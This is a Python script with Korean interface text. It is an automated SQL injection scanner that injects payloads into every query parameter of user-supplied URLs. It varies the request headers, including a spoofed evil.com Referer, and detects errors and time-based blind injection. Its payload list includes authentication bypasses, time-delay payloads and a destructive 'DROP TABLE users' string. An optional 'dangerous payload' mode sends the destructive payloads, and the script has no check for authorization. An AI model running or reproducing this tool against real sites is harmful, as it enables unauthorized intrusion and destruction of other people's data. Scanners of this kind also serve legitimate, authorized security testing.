import sys
import subprocess

try:
    import requests
except ImportError:
    print("requests 모듈이 없습니다. 자동 설치 중...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
    import requests

import urllib.parse
import time
import re

def print_usage():
    print("="*60)
    print(" SQL Injection 자동 스캐너 (헤더 조작 + 블라인드 SQLi + 위험 페이로드 옵션)")
    print()
    print(" 사용법:")
    print(" 1) 검사할 URL을 한 줄에 하나씩 입력하세요.")
    print(" 2) 입력 완료 후 빈 줄(엔터)만 눌러주세요.")
    print(" 3) 위험 페이로드 포함 여부를 묻습니다.")
    print(" 4) 위험 페이로드 포함 선택 시 경고 메시지와 함께 전체 페이로드 검사.")
    print(" 5) 위험 페이로드 제외 선택 시 안전 페이로드만 검사합니다.")
    print()
    print(" 예) https://example.com/page.php?id=1")
    print("     https://test.com/search.php?q=test&lang=en")
    print("="*60)
    print()

base_payloads = [
    "' OR '1'='1",
    "' OR 1=1--",
    "'; DROP TABLE users; --",
    "\" OR \"1\"=\"1",
    "' OR 'x'='x",
    "' OR 1=1#",
    "' OR 1=1/*",
    "' OR sleep(5)--",
    "'; WAITFOR DELAY '0:0:5'--",
    "' OR BENCHMARK(1000000,MD5(1))--",
]

dangerous_commands = [
    "exit",
    "ex!t",
    "quit",
    "shutdown",
    "shutd0wn",
    "shut-d0wn",
    "drop database",
    "drop table",
    "delete from",
    "kill",
    "truncate",
    "alter",
    "create",
    "while(1)",
    "loop",
    "sleep(9999)",
    "sleep(999)",
    "sleep(99999)",
]

def is_dangerous_payload(payload):
    lower = payload.lower()
    for cmd in dangerous_commands:
        pattern = re.sub(r'[^a-z0-9]', r'[^a-z0-9]*', cmd.lower())
        if re.search(pattern, lower):
            return True
    return False

def generate_variants(payload):
    variants = [payload]

    if "--" in payload:
        variants.append(payload.replace("--", "#"))
        variants.append(payload.replace("--", "/*"))
    if "/*" in payload:
        variants.append(payload.replace("/*", "--"))

    variants.append(payload.replace(" ", "%20"))
    variants.append(payload.replace(" ", "/**/"))

    if not payload.startswith("'"):
        variants.append("'" + payload)
    if not payload.endswith("'"):
        variants.append(payload + "'")
    if not payload.startswith('"'):
        variants.append('"' + payload)
    if not payload.endswith('"'):
        variants.append(payload + '"')

    calc_payloads = [
        payload + " AND 4/2=2",
        payload + " AND 5-3=2",
        payload + " OR 3*1=3",
    ]
    variants.extend(calc_payloads)

    return list(set(variants))

def test_sql_injection(urls, base_payloads, include_dangerous):
    vulnerable = False
    timeout_threshold = 4  # seconds

    headers_list = [
        {},  # 기본 헤더
        {"User-Agent": "Mozilla/5.0 (compatible; SQLiScanner/1.0)"},
        {"Referer": "http://evil.com/"},
        {"X-Forwarded-For": "127.0.0.1"},
        {"Cookie": "sessionid=abcdef123456"},
    ]

    print(f"[*] 테스트 시작 - 위험 페이로드 포함: {include_dangerous}\n")

    if include_dangerous:
        payloads_to_test = base_payloads
    else:
        payloads_to_test = [p for p in base_payloads if not is_dangerous_payload(p)]
        print(f"[i] 위험 페이로드 {len(base_payloads) - len(payloads_to_test)}개 제외, 안전 페이로드만 검사")

    for url in urls:
        print(f"\nTesting URL: {url}")
        parsed = urllib.parse.urlparse(url)
        query_params = dict(urllib.parse.parse_qsl(parsed.query))

        if not query_params:
            print(" 쿼리 파라미터가 없어 검사하지 않습니다.")
            continue

        for param_name in query_params.keys():
            print(f" 파라미터 테스트: {param_name}")
            for payload in payloads_to_test:
                if include_dangerous and is_dangerous_payload(payload):
                    print(f"[!] 경고: 위험 페이로드 포함 테스트 중: {payload}")

                variants = generate_variants(payload)
                for variant in variants:
                    if include_dangerous and is_dangerous_payload(variant):
                        print(f"[!] 경고: 위험 페이로드 변형 포함 테스트 중: {variant}")

                    for headers in headers_list:
                        params_copy = query_params.copy()
                        params_copy[param_name] = variant
                        new_query = urllib.parse.urlencode(params_copy)
                        test_url = urllib.parse.urlunparse(
                            (parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment)
                        )
                        try:
                            start_time = time.time()
                            response = requests.get(test_url, headers=headers, timeout=10)
                            elapsed = time.time() - start_time
                            content = response.text.lower()
                            error_signatures = ['sql syntax', 'mysql', 'syntax error', 'unclosed quotation mark', 'odbc', 'invalid query']

                            if any(err in content for err in error_signatures):
                                print(f"[!] SQLi 의심 - 파라미터 '{param_name}', 페이로드: {variant} (헤더: {headers})")
                                vulnerable = True
                            elif "welcome" in content or "logged in" in content:
                                print(f"[+] 반응 변화 감지 - 파라미터 '{param_name}', 페이로드: {variant} (헤더: {headers}) - 취약 가능성 있음")
                                vulnerable = True

                            if elapsed > timeout_threshold:
                                print(f"[!] 블라인드 SQLi 의심 (시간 기반) - 파라미터 '{param_name}', 페이로드: {variant} (헤더: {headers}), 응답시간: {elapsed:.2f}s")
                                vulnerable = True

                        except Exception as e:
                            print(f"페이로드 '{variant}' 테스트 중 에러 - 파라미터 '{param_name}': {e}")

    if not vulnerable:
        print("\n[-] 테스트된 페이로드에서 SQL Injection 취약점이 발견되지 않았습니다.")

def main():
    print_usage()

    urls = []
    while True:
        line = input("URL 입력 (빈 줄 시 종료): ").strip()
        if not line:
            break
        urls.append(line)

    if not urls:
        print("입력된 URL이 없습니다. 프로그램 종료.")
        sys.exit(0)

    while True:
        yn = input("위험 페이로드 포함 테스트를 진행하시겠습니까? (y/n): ").strip().lower()
        if yn in ['y', 'n']:
            include_dangerous = (yn == 'y')
            break
        print("y 또는 n 으로 입력해주세요.")

    print("\nSQL Injection 테스트를 시작합니다...\n")
    test_sql_injection(urls, base_payloads, include_dangerous)

if __name__ == "__main__":
    main()
    input("검사 완료! 종료하려면 아무 키나 누르세요...")